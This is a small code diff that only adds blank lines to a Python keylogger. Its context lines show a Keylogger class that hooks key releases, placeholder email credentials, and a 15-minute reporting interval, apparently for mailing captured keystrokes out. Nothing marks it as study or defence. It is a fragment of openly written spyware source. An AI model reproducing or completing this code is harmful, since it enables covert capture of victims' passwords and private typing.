@@ -6,6 +6,7 @@ SEND_REPORT_EVERY = 900  # 15 minutes
 EMAIL_ADDRESS = "Your_Email_Goes_Here"
 EMAIL_PASSWORD = "Your_Password_Goes_Here"
 
+
 class Keylogger:
     def __init__(self, interval):
         self.interval = interval
@@ -39,6 +40,7 @@ class Keylogger:
         keyboard.on_release(callback=self.callback)
         self.report()
         self.semaphore.acquire()
+
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
